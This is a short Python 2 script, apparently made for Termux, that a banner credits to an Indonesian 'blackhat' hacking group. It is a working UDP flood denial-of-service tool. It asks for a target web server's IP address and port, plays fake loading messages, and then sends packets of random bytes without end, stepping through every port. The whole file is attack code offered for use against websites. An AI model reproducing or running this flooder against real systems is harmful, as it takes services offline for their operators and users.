import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet TERMUX EXE")
print "========================================================="
print "= [RED]CREATOR SC   : ORGANIZATION MATA ELANG CYBER BLACKHAT ="
print "= [GREEN]ORGANISASI   : HACKING DARK HAT YOGYAKARTA            ="
print "= [RED]SC GITHUB    : https://github.com/ALUMINAUM/Ddos-Pro  ="
print "========================================================="
print
ip = raw_input("[RED]IP ADDRESS TARGET WEB : ")
port = input("[GREEN]PORT TARGET WEB      : ")

os.system("clear")
os.system("[RED] figlet ATTACK WEB")
time.sleep(5)
print "[YELLOW]APAKAH KAMU YAKIN ?"
yes = raw_input("YA / TIDAK : ")
time.sleep(5)
print "[GREEN]LOADING DATABASE.."
time.sleep(3)
print "[GREEN]DONE"
time.sleep(4)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "[RED]Menginstall %s [GREEN]Paket %s [RED]Ke Port %s"%(sent,ip,port)
     if port == 65534:
       port = 1
  
